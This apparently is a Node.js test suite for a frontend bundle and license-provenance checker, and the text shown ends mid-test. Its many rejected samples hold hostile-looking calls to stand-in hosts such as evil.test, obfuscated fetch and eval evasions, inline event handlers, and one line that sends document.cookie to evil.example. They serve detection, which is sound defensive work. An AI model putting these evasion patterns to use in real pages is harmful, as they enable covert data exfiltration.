import assert from "node:assert/strict"
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs"
import { tmpdir } from "node:os"
import path from "node:path"
import test from "node:test"

import {
  buildNotices,
  cssPackageImports,
  frontendProvenancePlugin,
  isDemoFixtureId,
  normalizeModuleId,
  packageEvidence,
  sha256,
} from "../../scripts/frontend_provenance_plugin.mjs"
import {
  assertNoAutomaticExternalRequests,
  assertNoExternalRequestsInOutputs,
  assertNoFixtureMaterial,
  validateFixtureManifest,
  verifyFinalOutputs,
} from "../../scripts/check_frontend_bundle.mjs"
import {
  normalizePnpmLicenses,
  reconcile,
} from "../../scripts/check_frontend_licenses.mjs"

function signature(bytes) {
  const length = Math.min(96, bytes.length)
  const last = Math.max(0, bytes.length - length)
  const offsets = [
    0,
    Math.floor(last / 4),
    Math.floor(last / 2),
    Math.floor((last * 3) / 4),
    last,
  ]
  return {
    size: bytes.length,
    sha256: sha256(bytes),
    windows: [...new Set(offsets)]
      .sort((left, right) => left - right)
      .map((offset) => ({
        offset,
        length,
        base64: bytes.subarray(offset, offset + length).toString("base64"),
      })),
  }
}

function withTempDirectory(callback) {
  const directory = mkdtempSync(path.join(tmpdir(), "nikodym-supply-test-"))
  try {
    callback(directory)
  } finally {
    rmSync(directory, { recursive: true, force: true })
  }
}

test("normaliza ids Vite antes de clasificar fixtures", () => {
  assert.equal(normalizeModuleId("\0/C:\\repo\\web\\src\\x.ts?raw"), "/C:/repo/web/src/x.ts")
  assert.equal(isDemoFixtureId("/repo/web/src/fixtures/demo/results.json?raw"), true)
  assert.equal(isDemoFixtureId("web/src/fixtures/demo/results.json?raw"), true)
  assert.equal(
    isDemoFixtureId("file:///repo/web/src/fixtures/%64emo/results.json?raw#fragment"),
    true,
  )
  assert.equal(
    isDemoFixtureId("/@fs//repo/web/src/fixtures/%64emo/results.json#x?raw"),
    true,
  )
  assert.equal(
    isDemoFixtureId("/repo/web/src/fixtures/%252564emo/results.json"),
    true,
  )
  assert.throws(() => normalizeModuleId("/repo/%ZZ/file.js"), /no normalizable/)
  assert.throws(() => normalizeModuleId("/repo/%25/file.js"), /no normalizable|porcentual/)
})

test("transform rechaza fixture oculto o módulo absoluto externo aunque sea tree-shaken", () => {
  const plugin = frontendProvenancePlugin()
  for (const id of [
    "/repo/web/src/fixtures/demo/nested/result.json?raw",
    "file:///repo/web/src/fixtures/%64emo/nested/result.json#raw",
    "/@fs//repo/web/src/fixtures/%64emo/nested/result.json?raw",
  ]) {
    assert.throws(() => plugin.transform("", id), /Fixture demo/)
  }
  assert.throws(() => plugin.transform("", "/outside/nikodym-module.js"), /fuera del repositorio/)
})

test("atribuye imports CSS que Tailwind resuelve fuera de transform", () => {
  const ids = cssPackageImports(path.resolve("src"))
  for (const name of ["tailwindcss", "shadcn", "tw-animate-css"]) {
    assert.equal(ids.some((id) => id.includes(`/node_modules/${name}/package.json`)), true)
  }
})

test("notices versionados coinciden byte a byte con procedencia", () => {
  const provenance = JSON.parse(readFileSync("dist/evidence/frontend-provenance.json", "utf8"))
  const notices = readFileSync("../src/nikodym/ui/static/THIRD_PARTY_NOTICES.frontend.txt")
  assert.deepEqual(Buffer.from(buildNotices(provenance.packages)), notices)
})

test("packageEvidence conserva LICENSE, NOTICE, COPYRIGHT y referencias declaradas", () => {
  const parent = path.resolve("node_modules")
  const packageRoot = mkdtempSync(path.join(parent, ".nikodym-license-fixture-"))
  try {
    writeFileSync(
      path.join(packageRoot, "package.json"),
      JSON.stringify({
        name: "fixture-license",
        version: "1.0.0",
        license: "MIT",
        attributionFile: "ATTRIBUTION.md",
        license_file: "DECLARED.txt",
      }),
    )
    for (const name of [
      "LICENSE",
      "LICENCE.txt",
      "NOTICE",
      "COPYING",
      "COPYRIGHT",
      "ATTRIBUTION.md",
    ]) {
      writeFileSync(path.join(packageRoot, name), `${name}\n`)
    }
    writeFileSync(path.join(packageRoot, "DECLARED.txt"), "  declared text  \n\n")
    writeFileSync(path.join(packageRoot, "LICENSE-MIT"), "MIT variant\n")
    writeFileSync(path.join(packageRoot, "LICENSE.exe"), "not a legal text\n")
    writeFileSync(path.join(packageRoot, "copyright.mjs"), "export const copyright = true")
    writeFileSync(path.join(packageRoot, "copyright.mjs.map"), "{}")
    const evidence = packageEvidence(path.join(packageRoot, "package.json"))
    assert.deepEqual(
      evidence.license_files.map((entry) => entry.relative_path),
      [
        "ATTRIBUTION.md",
        "COPYING",
        "COPYRIGHT",
        "DECLARED.txt",
        "LICENCE.txt",
        "LICENSE",
        "LICENSE-MIT",
        "NOTICE",
      ],
    )
    assert.equal(
      evidence.license_files.some((entry) => entry.relative_path.includes("copyright.mjs")),
      false,
    )
    const originalMetadata = readFileSync(path.join(packageRoot, "package.json"), "utf8")
    const declaredMetadata = JSON.parse(originalMetadata)
    declaredMetadata.copyrightFile = "copyright.mjs"
    writeFileSync(path.join(packageRoot, "package.json"), JSON.stringify(declaredMetadata))
    const explicitlyDeclared = packageEvidence(path.join(packageRoot, "package.json"))
    assert.equal(
      explicitlyDeclared.license_files.some(
        (entry) => entry.relative_path === "copyright.mjs",
      ),
      true,
    )
    writeFileSync(path.join(packageRoot, "package.json"), originalMetadata)
    assert.match(buildNotices([evidence]), /  declared text  \n\n/)
    assert.throws(
      () => buildNotices([{ ...evidence, name: "identidad-falsa" }]),
      /package_root no coincide/,
    )
    assert.throws(
      () => buildNotices([{ ...evidence, package_root: "../../package.json" }]),
      /ruta relativa insegura/,
    )
    const licenseEntry = evidence.license_files.find((entry) => entry.relative_path === "LICENSE")
    assert.ok(licenseEntry)
    assert.throws(
      () => buildNotices([
        { ...evidence, license_files: [{ ...licenseEntry, relative_path: "../../package.json" }] },
      ]),
      /ruta relativa insegura/,
    )
    symlinkSync("LICENSE", path.join(packageRoot, "LEGAL-LINK"))
    assert.throws(
      () => buildNotices([
        { ...evidence, license_files: [{ ...licenseEntry, relative_path: "LEGAL-LINK" }] },
      ]),
      /no regular/,
    )
    rmSync(path.join(packageRoot, "LEGAL-LINK"))
    writeFileSync(path.join(packageRoot, "LICENSE"), "MUTATED\n")
    assert.throws(() => buildNotices([evidence]), /evidencia cambió/)
    writeFileSync(path.join(packageRoot, "LICENSE"), "x")
    assert.throws(() => buildNotices([evidence]), /evidencia cambió/)
    writeFileSync(
      path.join(packageRoot, "package.json"),
      JSON.stringify({
        name: "fixture-license",
        version: "1.0.0",
        license: "MIT",
        license_file: "MISSING.txt",
      }),
    )
    assert.throws(
      () => packageEvidence(path.join(packageRoot, "package.json")),
      /referencia ausente/,
    )
  } finally {
    rmSync(packageRoot, { recursive: true, force: true })
  }
})

test("HTML distingue navegación deliberada, loopback y requests automáticos externos", () => {
  for (const html of [
    '<a title="1 > 0" href="https://docs.nikodym.cl">Docs</a>',
    '<area href="https://docs.nikodym.cl/map">',
    '<link rel=canonical href=https://docs.nikodym.cl>',
    '<script>const docs="https://docs.nikodym.cl"</script>',
    '<script type=application/json>{"example":"fetch(\\"https://evil.test\\")"}</script>',
    '<script type=application/ld+json>{"url":"https://docs.test"}</script>',
    '<script type=text/plain>fetch("https://evil.test")</script>',
    '<script type=importmap>{"imports":{"x":"https://cdn.test/x.js"}}</script>',
    '<script type=speculationrules>{"prerender":[{"urls":["/local"]}]}</script>',
    '<script>fetch("/api/schema")</script>',
    '<script>fetch("http://localhost:8000/api")</script>',
    '<script>new WebSocket("ws://127.0.0.1:8000/ws")</script>',
    '<script>new Worker("http://[::1]:8000/worker.js")</script>',
    '<img src="/asset.png?one=1&amp;two=2">',
    '<a href="data:text/plain,documentacion">Datos deliberados</a>',
    '<div style="background:url(data:image/svg+xml,%3Csvg/%3E)"></div>',
  ]) {
    assert.doesNotThrow(() => assertNoAutomaticExternalRequests(html))
  }
  for (const html of [
    '<link rel=stylesheet href=https://cdn.test/x.css>',
    '<link rel=prefetch href=https://cdn.test/data.json>',
    '<link rel=apple-touch-icon href=https://cdn.test/icon.png>',
    '<link rel=prerender href=https://cdn.test/page>',
    '<link rel=dns-prefetch href=//cdn.test>',
    '<img srcset="/x.png 1x, //cdn.test/x.png 2x">',
    '<link rel=preload as=image imagesrcset="//cdn.test/x.png 1x">',
    '<object data="https://cdn.test/x.pdf">',
    '<video poster=https://cdn.test/poster.jpg>',
    '<body background=https://cdn.test/background.png>',
    '<iframe srcdoc="<img src=https://cdn.test/x.png>"></iframe>',
    '<script src="data:text/javascript,alert(1)"></script>',
    '<img src="blob:https://cdn.test/id">',
    '<svg><image href=https://cdn.test/x.svg></image></svg>',
    '<svg><use xlink:href=https://cdn.test/x.svg#icon></use></svg>',
    '<div href=https://cdn.test/automatic></div>',
    '<script src="https&colon;&sol;&sol;cdn.test/x.js"></script>',
    '<script src="https:&#47;&#47;cdn.test/x.js"></script>',
    '<script src="https&#58//cdn.test/x.js"></script>',
    '<script src="h&Tab;ttps://cdn.test/x.js"></script>',
    '<script src="h&NewLine;ttps://cdn.test/x.js"></script>',
    '<script SRC="/x.js" src="/y.js"></script>',
    '<meta http-equiv=refresh content="0;https://cdn.test/page">',
    '<meta http-equiv=refresh content="0,https://cdn.test/page">',
    '<script type=speculationrules>{"prerender":[{"urls":["https://cdn.test/page"]}]}</script>',
    '<style>body{background:url("https://cdn.test/x.png")}</style>',
    '<div style="background:url(h\\74 tps://cdn.test/x.png)">x</div>',
    '<script>navigator.sendBeacon("https://cdn.test/beacon", "x")</script>',
    '<script>const x=new XMLHttpRequest();x.open("GET","https://cdn.test/x")</script>',
    '<script>new Worker("https://cdn.test/w.js")</script>',
    '<script>new SharedWorker("https://cdn.test/sw.js")</script>',
    '<script>const url="https://cdn.test/x"; fetch(url)</script>',
    '<script>const url="https://"+"cdn.test/x"; fetch(url)</script>',
    '<script>fetch("https://localhost@evil.test/x")</script>',
    '<script>fetch("http://127.0.0.1.evil.test/x")</script>',
  ]) {
    assert.throws(() => assertNoAutomaticExternalRequests(html))
  }
})

test("scanner de outputs detecta sinks JS y escapes CSS sin bloquear strings sueltas", () => {
  withTempDirectory((directory) => {
    const js = path.join(directory, "app.js")
    const css = path.join(directory, "app.css")
    writeFileSync(
      js,
      'const docs="https://docs.test";const url="https://"+"evil.test/x";fetch(url)',
    )
    writeFileSync(css, 'body{background:url(h\\74 tps://evil.test/x.png)}')
    assert.throws(() => assertNoExternalRequestsInOutputs([js, css]), /externos/)
    writeFileSync(js, 'const docs="https://docs.test";fetch("/api/schema")')
    writeFileSync(css, 'body{background:url("data:image/svg+xml;base64,PHN2Zy8+")}')
    assert.doesNotThrow(() => assertNoExternalRequestsInOutputs([js, css]))
  })
})

test("parser TypeScript cubre aliases, llamadas indirectas y globals reales", () => {
  withTempDirectory((directory) => {
    const js = path.join(directory, "app.js")
    const rejected = [
      'globalThis["fetch"]?.("https://evil.test/x")',
      'globalThis?.["fe"+"tch"]?.("https://evil.test/x")',
      '(0, fetch)("https://evil.test/x")',
      'var f=fetch;f("https://evil.test/x")',
      'let f=fetch;f("https://evil.test/x");f=()=>{}',
      'fetch.call(null,"https://evil.test/x")',
      'fetch.apply(null,["https://evil.test/x"])',
      'const f=fetch.bind(null,"https://evil.test/x");f()',
      'Reflect.apply(fetch,null,["https://evil.test/x"])',
      'Reflect.construct(WebSocket,["wss://evil.test/x"])',
      'new (globalThis["Worker"])("https://evil.test/w.js")',
      'navigator["sendBeacon"]("https://evil.test/b","x")',
      'window.navigator.sendBeacon("https://evil.test/b","x")',
      'globalThis.navigator.sendBeacon("https://evil.test/b","x")',
      'const x=new XMLHttpRequest();x.open("GET","https://evil.test/x")',
      'const x=new globalThis.XMLHttpRequest();x.open("GET","https://evil.test/x")',
      'const X=XMLHttpRequest;new X().open("GET","https://evil.test/x")',
      'const g=globalThis;g.fetch("https://evil.test/x")',
      'const n=navigator;n.sendBeacon("https://evil.test/x")',
      'const {fetch:f}=globalThis;f("https://evil.test/x")',
      'const {["fe"+"tch"]:f}=globalThis;f("https://evil.test/x")',
      'const k=get();globalThis[k]("https://evil.test/x")',
      'const k=get();const f=globalThis[k];f("https://evil.test/x")',
      'importScripts("/local.js","https://evil.test/x.js")',
      'const f=fetch;consume(f)',
      'const make=()=>fetch;make()("https://evil.test/x")',
      'let x=new XMLHttpRequest();x.open("GET","https://evil.test/x");x=null',
      'let n=navigator;n.sendBeacon("https://evil.test/x");n=null',
      'function g(x){x.open("GET","https://evil.test/x")}g(new XMLHttpRequest())',
      'function g(x){x.sendBeacon("https://evil.test/x")}g(navigator)',
      'function g(x){x.fetch("https://evil.test/x")}g(globalThis)',
      'function make(){return new XMLHttpRequest()}make().open("GET","https://evil.test/x")',
      'const o={x:new XMLHttpRequest()};o.x.open("GET","https://evil.test/x")',
      'const o=[new XMLHttpRequest()];o[0].open("GET","https://evil.test/x")',
      'const o={fetch};o.fetch("https://evil.test/x")',
      'const o={eval};o.eval("fetch(\\"https://evil.test/x\\")")',
      'const o={navigator};o.navigator.sendBeacon("https://evil.test/x")',
      '(true?fetch:null)("https://evil.test/x")',
      'const f=fetch||null;f("https://evil.test/x")',
      'import("https://evil.test/module.js")',
      'import.defer("https://evil.test/module.js")',
      'export * from "https://evil.test/module.js"',
      'fetch(`https://${host}/x`)',
      'const base="http://localhost:8000";fetch(`${base}${path}`)',
      'let url="https://evil.test/x";url="/api/safe";fetch(url)',
      'function g(u){fetch(u);var u="/api/safe"}',
      'fetch("data:text/plain,automatic")',
    ]
    for (const source of rejected) {
      writeFileSync(js, source)
      assert.throws(
        () => assertNoExternalRequestsInOutputs([js]),
        /externos|dinámica|automática/,
        source,
      )
    }

    const accepted = [
      'const text="fetch(\\"https://evil.test\\")"; /fetch\\(.+\\)/',
      'function local(fetch){fetch("https://evil.test/x")} local(()=>{})',
      'const t={fetch(){}};t.fetch("https://evil.test/x")',
      'fetch(`/api/items/${id}`)',
      'fetch(`./assets/${name}`)',
      'fetch(`http://localhost:8000/api/${id}`)',
      'fetch(`http://localhost:8000/${id}`)',
      'const p="/api/";const url=p+id;fetch(url)',
      'import("./local-module.js")',
      'new Worker("http:\\\\localhost:8000\\\\worker.js")',
    ]
    for (const source of accepted) {
      writeFileSync(js, source)
      assert.doesNotThrow(() => assertNoExternalRequestsInOutputs([js]), source)
    }
  })
})

test("parser TypeScript rechaza sintaxis ambigua y sinks con argumentos desconocidos", () => {
  withTempDirectory((directory) => {
    const js = path.join(directory, "app.js")
    for (const source of [
      "fetch(",
      "fetch(url)",
      "fetch.bind(null)(url)",
      "Reflect.apply(fetch,null,args)",
      "const x=new XMLHttpRequest();x.open(method,url)",
      "import(url)",
    ]) {
      writeFileSync(js, source)
      assert.throws(() => assertNoExternalRequestsInOutputs([js]))
    }
  })
})

test("ejecución dinámica global se analiza recursivamente y falla cerrada", () => {
  withTempDirectory((directory) => {
    const js = path.join(directory, "dynamic.js")
    const rejected = [
      'Function("fetch(\\"https://evil.test/x\\")")()',
      'new Function("fetch(\\"https://evil.test/x\\")")()',
      'globalThis.Function("fetch(\\"https://evil.test/x\\")")()',
      'eval("fetch(\\"https://evil.test/x\\")")',
      '(0,eval)("fetch(\\"https://evil.test/x\\")")',
      'setTimeout("fetch(\\"https://evil.test/x\\")",0)',
      'setInterval("fetch(\\"https://evil.test/x\\")",10)',
      'Function.call(null,"fetch(\\"https://evil.test/x\\")")()',
      'Function.apply(null,["fetch(\\"https://evil.test/x\\")"])()',
      'eval.call(null,"fetch(\\"https://evil.test/x\\")")',
      'Reflect.apply(eval,null,["fetch(\\"https://evil.test/x\\")"])',
      'const E=true?eval:null;E("fetch(\\"https://evil.test/x\\")")',
      'const {eval:E}=globalThis;E("fetch(\\"https://evil.test/x\\")")',
      'const make=()=>eval;make()("fetch(\\"https://evil.test/x\\")")',
      'const code="fetch(\\"https://evil.test/x\\")";setTimeout(code,0)',
      'let code="fetch(\\"https://evil.test/x\\")";setTimeout(code,0)',
      'const host="evil.test";setInterval(`fetch("https://${host}/x")`,10)',
      'function outer(code){setTimeout(code,0)};outer("fetch(\\"https://evil.test/x\\")")',
      'function outer(code){setTimeout(code,0)};const alias=outer;alias("fetch(\\"https://evil.test/x\\")")',
      'const schedule=()=>code=>setTimeout(code,0);schedule()("fetch(\\"https://evil.test/x\\")")',
      "Function(body)",
      "eval(code)",
      "setTimeout(callback,0)",
    ]
    for (const source of rejected) {
      writeFileSync(js, source)
      assert.throws(() => assertNoExternalRequestsInOutputs([js]), source)
    }
    const accepted = [
      'Function("return this")()',
      'eval("const docs=\\"https://docs.test\\"")',
      "setTimeout(()=>{},0)",
      "function tick(){};setInterval(tick,10)",
      "function outer(callback){setTimeout(callback,0)};outer(()=>{})",
      "const schedule=()=>callback=>setTimeout(callback,0);schedule()(()=>{})",
      "new Promise(resolve=>setTimeout(resolve,0))",
    ]
    for (const source of accepted) {
      writeFileSync(js, source)
      assert.doesNotThrow(() => assertNoExternalRequestsInOutputs([js]), source)
    }
  })
})

test("receptor no demostrablemente local trata el miembro como sink global", () => {
  withTempDirectory((directory) => {
    const js = path.join(directory, "receptor.js")
    const rejected = [
      'parent.fetch("https://evil.test/x")',
      'top.fetch("https://evil.test/x")',
      'frames.fetch("https://evil.test/x")',
      'window.parent.fetch("https://evil.test/x")',
      'window.window.fetch("https://evil.test/x")',
      'self.self.fetch("https://evil.test/x")',
      'globalThis.globalThis.fetch("https://evil.test/x")',
      'document.defaultView.fetch("https://evil.test/x")',
      'window.parent.window.top.self.fetch("https://evil.test/x")',
      'top["fetch"]("https://evil.test/x")',
      'top["fe"+"tch"]("https://evil.test/x")',
      'window.top.navigator.sendBeacon("https://evil.test/b","x")',
      'document.defaultView.navigator.sendBeacon("https://evil.test/b","x")',
      'new parent.EventSource("https://evil.test/x")',
      'new window.parent.Worker("https://evil.test/w.js")',
      'new top.SharedWorker("https://evil.test/sw.js")',
      'top.importScripts("/local.js","https://evil.test/x.js")',
      'parent.eval("fetch(\\"https://evil.test/x\\")")',
      'parent.setTimeout("fetch(\\"https://evil.test/x\\")",0)',
      'frames.setInterval("fetch(\\"https://evil.test/x\\")",10)',
      'new parent.Function("fetch(\\"https://evil.test/x\\")")()',
      'new Proxy(window,{}).fetch("https://evil.test/x")',
      'const w=new Proxy(window,{});w.fetch("https://evil.test/x")',
      'new Proxy(fetch,{})',
      'new Proxy(navigator,{}).sendBeacon("https://evil.test/b","x")',
      'new Reflect.get(window,"x").fetch("https://evil.test/x")',
      'const x=new parent.XMLHttpRequest();x.open("GET","https://evil.test/x")',
      'const X=frames.XMLHttpRequest;new X().open("GET","https://evil.test/x")',
      'const p=parent;p.fetch("https://evil.test/x")',
      'const {fetch:f}=parent;f("https://evil.test/x")',
      'const {eval:E}=top;E("fetch(\\"https://evil.test/x\\")")',
      'const k=get();parent[k]("https://evil.test/x")',
      'let g=window;g.fetch("https://evil.test/x");g=null',
      'let w=parent;w.fetch("https://evil.test/x");w=null',
      'function f(el){el.ownerDocument.defaultView.fetch("https://evil.test/x")}',
      'function f(node){node.contentWindow.fetch("https://evil.test/x")}',
      'function f(node){node.contentWindow.eval("fetch(\\"https://evil.test/x\\")")}',
      'function f(w){w.opener.fetch("https://evil.test/x")}',
      'ambiente().fetch("https://evil.test/x")',
      'parent.fetch(externo)',
      'parent.fetch(`https://${host}/x`)',
    ]
    for (const source of rejected) {
      writeFileSync(js, source)
      assert.throws(() => assertNoExternalRequestsInOutputs([js]), source)
    }
  })
})

test("un binding opaco o `this` nunca cuentan como receptor local", () => {
  withTempDirectory((directory) => {
    const js = path.join(directory, "bindings.js")
    const rejected = [
      // destructuring: el BindingElement no lo resuelve `stableInitializer`
      'const {top:T}=window;T.fetch("https://evil.example/x")',
      'const {window:w}=window;w.fetch("https://evil.example/x")',
      'const {parent}=window;parent.fetch("https://evil.example/x")',
      'const {defaultView}=document;defaultView.fetch("https://evil.example/x")',
      'const {top:{top:t}}=window;t.fetch("https://evil.example/x")',
      'const {top:T}=self;T.importScripts("https://evil.example/x.js")',
      'const {contentWindow}=document.body;contentWindow.fetch("https://evil.example/x")',
      'const [w]=[window];w.fetch("https://evil.example/x")',
      'function go({a}){a.fetch("https://evil.example/x")}go({})',
      // parámetro con valor por defecto
      'function go(w=window){w.fetch("https://evil.example/x")}go()',
      'function go({top:t}=window){t.fetch("https://evil.example/x")}go()',
      'const go=(w=globalThis)=>w.fetch("https://evil.example/x");go()',
      // campo de clase
      'class A{static w=window};A.w.fetch("https://evil.example/x")',
      'class A{w=window};new A().w.fetch("https://evil.example/x")',
      // binding de catch
      'try{throw window}catch(e){e.fetch("https://evil.example/x")}',
      'try{riesgo()}catch(e){e.fetch("https://evil.example/x")}',
      // `this` en script clásico es el objeto global
      'this.fetch("https://evil.example/x")',
      'this["fe"+"tch"]("https://evil.example/x")',
      'this["fe"+"tch"]("https://evil.example/?x="+document.cookie)',
      'this.eval("fetch(\\"https://evil.example/x\\")")',
      'this.setTimeout("fetch(\\"https://evil.example/x\\")",0)',
      'this.navigator.sendBeacon("https://evil.example/b","x")',
      'new this.EventSource("https://evil.example/x")',
    ]
    for (const source of rejected) {
      writeFileSync(js, source)
      assert.throws(() => assertNoExternalRequestsInOutputs([js]), source)
    }
  })
})

test("navegación automática e inyección de markup son sinks", () => {
  withTempDirectory((directory) => {
    const js = path.join(directory, "navegacion.js")
    const rejected = [
      'window.open("https://evil.test/x")',
      'open("https://evil.test/x")',
      'parent.open("https://evil.test/x")',
      'this.open("https://evil.test/x")',
      'document.defaultView.open("https://evil.test/x")',
      'window.open.call(null,"https://evil.test/x")',
      'const o=window.open;o("https://evil.test/x")',
      'const {open}=window;open("https://evil.test/x")',
      'location.assign("https://evil.test/x")',
      'window.location.assign("https://evil.test/x")',
      'this.location.assign("https://evil.test/x")',
      'location.replace("https://evil.test/x")',
      'top.location.replace("https://evil.test/x")',
      'const l=location;l.assign("https://evil.test/x")',
      'const {assign}=location;assign("https://evil.test/x")',
      'document.write("<img src=https://evil.test/x.png>")',
      'document.writeln("<b>")',
      'window.document.write("<b>")',
      'this.document.write("<b>")',
      'const {write}=document;write("<b>")',
      "document.write(dinamico)",
      'navigator.serviceWorker.register("https://evil.test/sw.js")',
      'window.navigator.serviceWorker.register("https://evil.test/sw.js")',
      'const {serviceWorker}=navigator;serviceWorker.register("https://evil.test/sw.js")',
      'el.insertAdjacentHTML("beforeend","<img src=https://evil.test/x.png>")',
      'document.body.insertAdjacentHTML("beforeend","<b>")',
      'function f(n){n.insertAdjacentHTML("afterbegin","<b>")}',
    ]
    for (const source of rejected) {
      writeFileSync(js, source)
      assert.throws(() => assertNoExternalRequestsInOutputs([js]), source)
    }
    const accepted = [
      // `.open` es prop booleana ubicua de base-ui (dialog/popover), no `window.open`
      "const s={open:!1};function ver(e){return e.open?1:0}",
      "function panel(ctx){return ctx.context?.open&&!ctx.disabled}",
      "class D{state={open:!1};ver(){return this.state.open}}",
      'const hd={open:"data-open"};const m={[hd.open]:""}',
      "function abre(dlg){dlg.open=!0;return dlg.open}",
      'const Pd={open(e){return e?1:null}};Pd.open(!0)',
      // `assign`/`replace`/`register` son nombres genéricos fuera de `location`
      "const o=Object.assign({},{a:1})",
      'function limpia(s){return s.replace(/a/g,"b")}',
      "const {assign}=Object;assign({},{a:1})",
      'const reg=new Map();reg.register=()=>{};reg.register("x")',
      // un service worker del propio árbol ya lo audita el gate archivo por archivo
      'navigator.serviceWorker.register("/sw.js")',
    ]
    for (const source of accepted) {
      writeFileSync(js, source)
      assert.doesNotThrow(() => assertNoExternalRequestsInOutputs([js]), source)
    }
  })
})

test("`< !` y `< /` no ocultan el tag siguiente", () => {
  // WHATWG §13.2.5.6: `<` + whitespace no abre tag, así que el `>` que sigue cierra el
  // tag SIGUIENTE; saltar hasta él dejaba el `<img>` fuera del análisis.
  for (const html of [
    '< !x <img id=a src="https://evil.invalid/a.png">',
    '< /  <img id=b src="https://evil.invalid/b.png">',
    '<   !x <img id=c src="https://evil.invalid/c.png">',
    '< ! <script src="https://evil.invalid/x.js"></script>',
    '< !-- <img src="https://evil.invalid/d.png">',
    '< / <link rel=stylesheet href="https://evil.invalid/x.css">',
    '<\t!x <img src="https://evil.invalid/e.png">',
    '< /body <iframe src="https://evil.invalid/f">',
  ]) {
    assert.throws(() => assertNoAutomaticExternalRequests(html), html)
  }
  for (const html of [
    '<!DOCTYPE html><img src="/local.png">',
    "<!-- comentario --><img src=/local.png>",
    '<div></div><img src="/local.png">',
    '<span></span><link rel=stylesheet href="/local.css">',
  ]) {
    assert.doesNotThrow(() => assertNoAutomaticExternalRequests(html), html)
  }
})

test("el receptor global no rompe objetos locales homónimos del bundle real", () => {
  withTempDirectory((directory) => {
    const js = path.join(directory, "calibracion.js")
    // Formas que el bundle React/app realmente contiene: si el gate las rechaza, la
    // regla de receptor está mal calibrada y el artefacto distribuible deja de pasar.
    const accepted = [
      'async function pdf(u){return u}'
      + 'const registro={pdf:{fetch:pdf,filename:"a.pdf"}};'
      + 'async function baja(k,n){const t=registro[k];return await t.fetch(n)}',
      "function programa(host,cb,ms){return host.setTimeout(cb,ms)}",
      "window.setTimeout(()=>{},1600)",
      "function sel(el){return(el.ownerDocument&&el.ownerDocument.defaultView||window).getSelection()}",
      "function salta(e,t){e=t.contentWindow;return e.document}",
      "function caja(nodo){return{top:nodo.top,parent:nodo.parent,left:nodo.left}}",
      "function activo(e){e=e!=null&&e.ownerDocument!=null?e.ownerDocument.defaultView:window;return e.document}",
      "function raiz(e){var t;return(e==null||(t=e.ownerDocument)==null?void 0:t.defaultView)||window}",
      "function ratio(e){return(e.ownerDocument.defaultView||window).devicePixelRatio||1}",
      "function due(n){return n.window===n?n.document:n.nodeType===9?n:n.ownerDocument}",
      'const cache=new Map();function lee(k){return cache.get(k)}',
      // destructuring de geometría desde un local: no es autoridad de realm
      "function caja(el){const r=el.getBoundingClientRect();"
      + "const{left:u,top:d,width:f,height:p}=r;return u+d+f+p}",
      "function estilo(nodo){const{top,left}=nodo.style;return top+left}",
      // `catch` y campos de clase inocuos
      "function corre(g){try{g()}catch(e){return e.message}}",
      "class C{estado=new Map();lee(k){return this.estado.get(k)}}",
      "class C{constructor(){this.n=0}inc(){this.n+=1;return this.n}}",
      // parámetro con default que no es autoridad
      "function espera(ms=1600){return ms}",
      'Function("return this")()',
    ]
    for (const source of accepted) {
      writeFileSync(js, source)
      assert.doesNotThrow(() => assertNoExternalRequestsInOutputs([js]), source)
    }
  })
})

test("los handlers inline on* se rechazan en HTML y SVG", () => {
  for (const html of [
    "<body onload=\"fetch('https://evil.test/x')\">",
    "<img src=x onerror=\"fetch('https://evil.test/x')\">",
    "<svg onload=\"fetch('https://evil.test/x')\"></svg>",
    "<div ONCLICK=\"location='https://evil.test/x'\"></div>",
    "<img src=/local.png onerror=0>",
    "<body onpageshow=x>",
    "<input onfocusin=y>",
    "<a href=# onmouseover=z>t</a>",
    "<animate onbegin=w>",
    "<img / onerror=\"fetch('https://evil.test/x')\">",
    "<img src=x onerror=&#102;etch()>",
    // `ononline` sí es handler (evento `online` de window); `online` no lo es
    "<body ononline=x>",
    "<div onwebkitanimationend=x></div>",
  ]) {
    assert.throws(() => assertNoAutomaticExternalRequests(html), /Handler inline/, html)
  }
  for (const html of [
    '<div data-online="1"></div>',
    '<div ono-x="1"></div>',
    '<a href="#" on1="x">t</a>',
    // palabras inglesas que casan /^on[a-z]+$/ sin ser handlers de ningún navegador
    '<div online="1"></div>',
    '<div once="1"></div>',
    '<div only="1"></div>',
    '<div onto="1"></div>',
  ]) {
    assert.doesNotThrow(() => assertNoAutomaticExternalRequests(html), html)
  }
})

test("un / suelto no oculta los atributos siguientes del tag", () => {
  for (const html of [
    '<img / src="https://cdn.test/x.png">',
    '<img/src="https://cdn.test/x.png">',
    '<script / src="https://cdn.test/x.js"></script>',
    '<link / rel=stylesheet href="https://cdn.test/x.css">',
    '<iframe / src="https://cdn.test/x">',
    '<meta / http-equiv=refresh content="0;url=https://cdn.test/page">',
    '<div / style="background:url(https://cdn.test/x.png)">',
    '<img //// src="https://cdn.test/x.png">',
    '<img / / src="https://cdn.test/x.png">',
    '<object / data="https://cdn.test/x.pdf">',
    '<video / poster="https://cdn.test/p.jpg">',
    '<body / background="https://cdn.test/b.png">',
    '<svg><use / xlink:href="https://cdn.test/x.svg#i"></use></svg>',
    '<link / rel=preload as=image imagesrcset="//cdn.test/x.png 1x">',
    '<script / SRC="/x.js" src="/y.js"></script>',
    '<script/src="https&colon;&sol;&sol;cdn.test/x.js"></script>',
  ]) {
    assert.throws(() => assertNoAutomaticExternalRequests(html), html)
  }
  for (const html of [
    "<br/>",
    '<img src="/local.png" />',
    '<img src="/local.png"/>',
    "<link rel=canonical href=https://docs.nikodym.cl />",
    '<div style="color:red" / >',
  ]) {
    assert.doesNotThrow(() => assertNoAutomaticExternalRequests(html), html)
  }
})

test("meta refresh acepta whitespace como separador, igual que WHATWG", () => {
  for (const html of [
    '<meta http-equiv="refresh" content="0 https://evil.test/page">',
    '<meta http-equiv="refresh" content="0\thttps://evil.test/page">',
    '<meta http-equiv="refresh" content="  3   https://evil.test/page">',
    '<meta http-equiv="refresh" content="0 url=https://evil.test/page">',
    '<meta http-equiv="refresh" content="0 URL = https://evil.test/page">',
    "<meta http-equiv='refresh' content='0 url=\"https://evil.test/page\"'>",
    '<meta http-equiv="refresh" content="0.5 https://evil.test/page">',
    '<meta http-equiv="refresh" content=".5 https://evil.test/page">',
    '<meta HTTP-EQUIV=REFRESH content="0 //cdn.test/page">',
    '<meta http-equiv="refresh" content="0 blob:https://evil.test/id">',
    '<meta http-equiv="refresh" content="0;https://cdn.test/page">',
    '<meta http-equiv="refresh" content="0,https://cdn.test/page">',
    '<meta http-equiv="refresh" content="0;url=https://cdn.test/page">',
  ]) {
